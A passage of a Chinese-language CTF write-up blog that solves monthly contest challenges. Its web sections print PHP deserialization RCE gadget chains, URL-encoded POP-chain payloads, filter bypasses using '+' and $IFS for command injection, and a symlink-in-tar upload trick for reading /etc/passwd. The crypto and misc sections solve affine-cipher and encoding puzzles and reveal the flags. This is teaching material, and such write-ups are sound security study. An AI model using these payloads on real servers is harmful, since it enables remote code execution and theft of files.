+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config = unserialize(base64_decode($config));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">    $p=$_GET[<span class="string">'p'</span>];    </span><br><span class="line">    $config-&gt;$p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $config;</span><br><span class="line">    <span class="keyword">private</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $filter;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConfig</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config == <span class="string">""</span>)&#123;</span><br><span class="line">            $config = <span class="keyword">isset</span>($_POST[<span class="string">'config'</span>])?$_POST[<span class="string">'config'</span>]:<span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SetFilter</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="comment">//        echo $value;</span></span><br><span class="line">        $value=waf_exec($value); </span><br><span class="line">        var_dump($value);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;filter)&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;filter <span class="keyword">as</span> $filter)&#123;</span><br><span class="line">            $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="keyword">array</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="comment">//var_dump($key);</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;SetFilter($key);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>可以看到在__get()函数，该函数是类在访问私有成员的时候会自动调用这个方法，具体机制还需要研究，然后这里与setfilter函数利用反序列化可以构成rce，在cookie中写入序列化值</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$snow = <span class="keyword">new</span> Config();</span><br><span class="line">$snow-&gt;filter = <span class="keyword">array</span>(<span class="string">'system'</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($snow));</span><br></pre></td></tr></table></div></figure>
+<p>然后访问</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10015&#x2F;index.php?p&#x3D;ls</span><br></pre></td></tr></table></div></figure>
+<p>发现即可列目录，但是由于过滤了空格和/，所以无法读文件，空格可以使用$IFS绕过，然后利用grep命令来读</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10015&#x2F;index.php?p&#x3D;grep$IFS-ri$IFS.$IFSflag</span><br></pre></td></tr></table></div></figure>
+<p>这个不理解，需要后续再学习</p>
+<p>在附上官方解法，待研究</p>
+<p><img src="/2020/09/13/month-race/11.png" alt></p>
+
+        <h3 id="interesting-web">
+          <a href="#interesting-web" class="heading-link"><i class="fas fa-link"></i></a>interesting web</h3>
+      <p>题目是一个flask框架，题目了修改密码功能，思路是修改admin的密码，flask框架中session<br>是存储在浏览器端的，虽然不能伪造但是可以破解，我们</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJsb2dpbiI6dHJ1ZSwidG9rZW4iOnsiIGIiOiJaamRrWlRaa1l6QmlZVEV4TlRVMU5UWTVaVFV3Wmpaak16ZGxNVFU1TURVPSJ9LCJ1c2VybmFtZSI6ImFkbWluIn0.DuKTNg.LtfGK8IX-4fJ6WO-6mcVJsU2hdI</span><br></pre></td></tr></table></div></figure>
+<p>第一个.号之前的内容是base64编码的，直接解密就可以了</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;login&quot;:true,&quot;token&quot;:&#123;&quot; b&quot;:&quot;ZjdkZTZkYzBiYTExNTU1NTY5ZTUwZjZjMzdlMTU5MDU&#x3D;&quot;&#125;,&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></div></figure>
+<p>再将b的值base64解码就可以得到token了，然后修改密码，以admin身份登录，然后利用软链接来读取文件</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd 1.jpg</span><br><span class="line">tar cvfp shell.tat 1.jpg</span><br></pre></td></tr></table></div></figure>
+<p>然后上传在访问图片，下载之，修改后缀为txt查看即可得到flag</p>
+
+        <h2 id="Crypt">
+          <a href="#Crypt" class="heading-link"><i class="fas fa-link"></i></a>Crypt</h2>
+      
+        <h3 id="仿射">
+          <a href="#仿射" class="heading-link"><i class="fas fa-link"></i></a>仿射</h3>
+      <p>仿射密码，题目已经给出了b的值，对于仿射密码来说</p>
+<p>加密过程为</p>
+<blockquote>
+<p>y≡e(x)≡a(x)+b(mod26)</p>
+</blockquote>
+<p>解密过程</p>
+<blockquote>
+<p>x ≡ d(e(x)) ≡ a’(e(x)-b)(mod26)         # a’为a的逆，在26以内是有限的</p>
+</blockquote>
+<p>我们只需要爆破即可</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">"achjbnpdfherebjsw"</span></span><br><span class="line">b=<span class="number">7</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">9</span>,<span class="number">21</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> c:</span><br><span class="line">        seq = (i*((ord(s)-ord(<span class="string">'a'</span>))-b)) % <span class="number">26</span></span><br><span class="line">        flag += chr(ord(<span class="string">'a'</span>)+seq)</span><br><span class="line">    print(flag)</span><br><span class="line">    flag = <span class="string">""</span></span><br></pre></td></tr></table></div></figure>
+<p>然后即可找到flag</p>
+<p><img src="/2020/09/13/month-race/12.png" alt></p>
+<!-- youareright -->
+
+        <h2 id="MISC-1">
+          <a href="#MISC-1" class="heading-link"><i class="fas fa-link"></i></a>MISC</h2>
+      
+        <h3 id="MISC1">
+          <a href="#MISC1" class="heading-link"><i class="fas fa-link"></i></a>MISC1</h3>
+      <p>题目如下</p>
+<blockquote>
+<p>中华文化博大精深，近日在教小外甥学习1-110之间的数字，可是小外甥比较调皮，不好好学，于是灵机一动，想到一个容易记忆，并且还可以识字的好办法，你知道我想出了什么办法吗？下边是在教外甥学习的一部分内容，你知道分别代表什么意思吗？</p>
+<p>（企鹅，青蛙，油漆，花旗参，救生圈，油漆，二胡，二石，漏斗，二石，二石，冰淇淋，漏斗，喇叭，油漆，冰淇淋，鹅卵石，21世纪，耳机，油漆，耳机，二石，二胡，耳机，21世纪，企鹅，二流子，二石，要发，二石，冰淇淋，冰淇淋，油漆，冰淇淋，企鹅，乔丹，二石，酒壶）</p>
+</blockquote>
+<p>这是一种数字密码表，好像叫110数字记忆表，是帮助提高记忆力的</p>
+<p>直接网上找对应的值然后脚本，获取数字之后，每个数字的加30取ascii码值就是flag</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cipher = (<span class="string">"企鹅"</span>,<span class="string">"青蛙"</span>,<span class="string">"油漆"</span>,<span class="string">"花旗参"</span>,<span class="string">"救生圈"</span>,<span class="string">"油漆"</span>,<span class="string">"二胡"</span>,<span class="string">"二石"</span>,<span class="string">"漏斗"</span>,<span class="string">"二石"</span>,<span class="string">"二石"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"漏斗"</span>,<span class="string">"喇叭"</span>,</span><br><span class="line"><span class="string">"油漆"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"鹅卵石"</span>,<span class="string">"21世纪"</span>,<span class="string">"耳机"</span>,<span class="string">"油漆"</span>,<span class="string">"耳机"</span>,<span class="string">"二石"</span>,<span class="string">"二胡"</span>,<span class="string">"耳机"</span>,<span class="string">"21世纪"</span>,<span class="string">"企鹅"</span>,<span class="string">"二流子"</span>,<span class="string">"二石"</span>,<span class="string">"要发"</span>,</span><br><span class="line"><span class="string">"二石"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"油漆"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"企鹅"</span>,<span class="string">"乔丹"</span>,<span class="string">"二石"</span>,<span class="string">"酒壶"</span>)</span><br><span class="line"></span><br><span class="line">dic = &#123;<span class="string">"企鹅"</span>:<span class="number">72</span>,<span class="string">"青蛙"</span>:<span class="number">78</span>,<span class="string">"油漆"</span>:<span class="number">67</span>,<span class="string">"花旗参"</span>:<span class="number">73</span>,<span class="string">"救生圈"</span>:<span class="number">93</span>,<span class="string">"二胡"</span>:<span class="number">25</span>,<span class="string">"二石"</span>:<span class="number">20</span>,<span class="string">"漏斗"</span>:<span class="number">69</span>,<span class="string">"喇叭"</span>:<span class="number">68</span>,<span class="string">"冰淇淋"</span>:<span class="number">70</span>,</span><br><span class="line"><span class="string">"鹅卵石"</span>:<span class="number">24</span>,<span class="string">"21世纪"</span>:<span class="number">21</span>,<span class="string">"耳机"</span>:<span class="number">27</span>,<span class="string">"二流子"</span>:<span class="number">26</span>,<span class="string">"要发"</span>:<span class="number">18</span>,<span class="string">"乔丹"</span>:<span class="number">23</span>,<span class="string">"酒壶"</span>:<span class="number">95</span>&#125;</span><br><span class="line"></span><br><span class="line">nums = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> cipher:</span><br><span class="line">    temp = dic.get(item)</span><br><span class="line">    nums += str(temp)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)//<span class="number">2</span>):</span><br><span class="line">    flag += chr(int(nums[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>])+<span class="number">30</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="12月月赛">
+          <a href="#12月月赛" class="heading-link"><i class="fas fa-link"></i></a>12月月赛</h1>
+      
+        <h2 id="MISC-2">
+          <a href="#MISC-2" class="heading-link"><i class="fas fa-link"></i></a>MISC</h2>
+      
+        <h3 id="签到题">
+          <a href="#签到题" class="heading-link"><i class="fas fa-link"></i></a>签到题</h3>
+      <p>关注公主号，回复flag会返回一个问题 <code>什么牛不会跑</code> ，答案是 <code>蜗牛</code> ,然后即可得到flag</p>
+<!-- flag{6ef1b2246e5e651a46bfa51cfa71b763} -->
+
+        <h3 id="学习资料">
+          <a href="#学习资料" class="heading-link"><i class="fas fa-link"></i></a>学习资料</h3>
+      <p>尝试爆破，但是爆破了好久都没有成功，最终无奈看了一下题解，解开压缩包，之后就是docx隐写，在设置中显示隐藏文字即可。</p>
+<!-- Flag{edaa144c91a4e5b817e4a18cbdb78879} -->
+
+        <h3 id="变换的指纹">
+          <a href="#变换的指纹" class="heading-link"><i class="fas fa-link"></i></a>变换的指纹</h3>
+      <p>用CSDN密码库密码爆破。我失败了，看了别人的密码<code>!(()!@)6125dou</code>（注意结尾的空格），之后即可得到压缩包，</p>
+<p>23685528276158852365572716835687172857481317</p>
+
+        <h3 id="JUJU">
+          <a href="#JUJU" class="heading-link"><i class="fas fa-link"></i></a>JUJU</h3>
+      <p>题目提示了说<code>11只JUJU</code>，但是图片中却不够11个，可知是图片高度的问题，修改一下图片高度</p>
+<p><img src="https://i.loli.net/2019/01/17/5c40908a8abf5.png" alt></p>
+<p>然后即可看到类似base64编码的字符串<code>MZWGCZ33GQZTQMTEM5SGMMTEPU====</code>，但是解码失败，尝试后发现是base32编码的，解密即可得到flag<code>flag{4382dgdf2d}</code></p>
+
+        <h3 id="菜刀666">
+          <a href="#菜刀666" class="heading-link"><i class="fas fa-link"></i></a>菜刀666</h3>
+      <p>先随便查看http流量，在最后的流量中发现了压缩包的传输，查看流量大致可以看到黑客是不断探测目录，最终探测出了flag坐在目录，向服务器请求了hello.zip的文件内容，将文件提取出来，发现在文件末尾有提示文字<code>well,you need passwd!</code>，可知zip压缩包基本不可能是伪加密，应该是需要密码的，再次查看流量包，发现一条超长的http的数据包，发现一段jpg图片的十六进制，提取存储为jpg图片</p>
+<p><img src="https://i.loli.net/2019/01/18/5c41e9b279481.png" alt></p>
+<p>打开图片即可看到密码，解压即可看到flag</p>
+<!-- flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z} -->
+
+        <h2 id="WEB">
+          <a href="#WEB" class="heading-link"><i class="fas fa-link"></i></a>WEB</h2>
+      
+        <h3 id="easy">
+          <a href="#easy" class="heading-link"><i class="fas fa-link"></i></a>easy</h3>
+      <p>代码审计，关键过滤如下</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br></pre></td></tr></table></div></figure>
+<p>可以看到是为了防止object类的序列化，但是过滤不够严谨，可以用 <code>+</code> 绕过 <code>o:14 -&gt; o:+14</code> </p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$data = <span class="keyword">new</span> baby();</span><br><span class="line">$data-&gt;file = <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">print</span>(serialize(($data)));<span class="comment">//给输出加一个加号在url编码一下</span></span><br></pre></td></tr></table></div></figure>
+<p>payload</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10007&#x2F;?data&#x3D;O%3A%2B4%3A%22baby%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></div></figure>
+<!-- flag{ad2328a2c3f0933c053fd3c6f28f6143} -->
+
+        <h3 id="ezweb2">
+          <a href="#ezweb2" class="heading-link"><i class="fas fa-link"></i></a>ezweb2</h3>
+      <p>既然是渗透测试，扫描一下目录，发现存在admin.php，登录后返回 <code>you are not admin.</code> ，查看cookie发现user值为<code>user</code>的base64值，我们将此值修改为 <code>admin</code> 的base64值，然后刷新可以看到一个命令执行界面，测试发现题目过滤了空格，尝试用$IFS绕过<br><code>cat$IFS/ffLAG_404</code> ，然后即可成功绕过</p>
+<p><img src="https://i.loli.net/2019/01/16/5c3f3979d4b1c.png" alt="result"></p>
+<!-- flag{6f1d95159e3b90ed28186c518dd15e8c} -->
+
+        <h1 id="1月月赛">
+          <a href="#1月月赛" class="heading-link"><i class="fas fa-link"></i></a>1月月赛</h1>
+      
+        <h2 id="web-2">
+          <a href="#web-2" class="heading-link"><i class="fas fa-link"></i></a>web</h2>
+      
+        <h3 id="babygo">
+          <a href="#babygo" class="heading-link"><i class="fas fa-link"></i></a>babygo</h3>
+      <p>代码审计题目</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>题目考察pop链的构造，核心点在于</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br></pre></td></tr></table></div></figure>
+<p>代码中修改了变量的值，这样if函数验证就无法通过，为了解决这个问题可以使用PHP中的指针（引用），是$aaa指向变量$bbb，这样修改了$aaa的值即相当于修改了$bbb的值</p>
+<p>构造pop链如下</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool();</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">"flag.php"</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing = <span class="string">'O:4:"baby":3:&#123;s:9:" * skyobj";N;s:3:"aaa";s:4:"snow";s:3:"bbb";R:3;&#125;'</span>; </span><br><span class="line">&#125;  </span><br><span class="line">$b = <span class="keyword">new</span> baby();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;O%3A4%3A&quot;baby&quot;%3A3%3A%7Bs%3A9%3A&quot;%00%2A%00skyobj&quot;%3BO%3A4%3A&quot;cool&quot;%3A3%3A%7Bs%3A8%3A&quot;filename&quot;%3Bs%3A8%3A&quot;flag.php&quot;%3Bs%3A4%3A&quot;nice&quot;%3BN%3Bs%3A6%3A&quot;amzing&quot;%3Bs%3A68%3A&quot;O%3A4%3A&quot;baby&quot;%3A3%3A%7Bs%3A9%3A&quot;+%2A+skyobj&quot;%3BN%3Bs%3A3%3A&quot;aaa&quot;%3Bs%3A4%3A&quot;snow&quot;%3Bs%3A3%3A&quot;bbb&quot;%3BR%3A3%3B%7D&quot;%3B%7Ds%3A3%3A&quot;aaa&quot;%3BN%3Bs%3A3%3A&quot;bbb&quot;%3BN%3B%7D</span><br></pre></td></tr></table></div></figure>
+<p>查看源代码即可得到flag</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// $flag = 'flag&#123;bd75a38e62ec0e450745a8eb8e667f5b&#125;';</span></span><br><span class="line">$sth=<span class="string">'test5030b66d4bdtest35daed9d51e2688377299test'</span>;</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="MISC-3">
+          <a href="#MISC-3" class="heading-link"><i class="fas fa-link"></i></a>MISC</h2>
+      
+        <h3 id="zhunianjixiang">
+          <a href="#zhunianjixiang" class="heading-link"><i class="fas fa-link"></i></a>zhunianjixiang</h3>
+      <p>题目是一张图片，但是却有2MB，一看就藏东西了，foremost分离一下</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost zhu.jpg</span><br></pre></td></tr></table></div></figure>
+<p>然后即可得到一张二维码，扫描一下</p>
+<p><img src="https://i.loli.net/2019/01/31/5c52a84fc2d4e.png" alt></p>
+<p>看来还有其他东西，stegsolve上查看一下得到flag</p>
+<p><img src="https://i.loli.net/2019/01/31/5c52a85a2c2bf.png" alt></p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;You_ARE_SOsmart&#125;</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="CRYPTO">
+          <a href="#CRYPTO" class="heading-link"><i class="fas fa-link"></i></a>CRYPTO</h2>
+      
+        <h3 id="真的是键盘吗">
+          <a href="#真的是键盘吗" class="heading-link"><i class="fas fa-link"></i></a>真的是键盘吗</h3>
+      <blockquote>
+<p>ypau_kjg;”g;”ypau+</p>
+</blockquote>
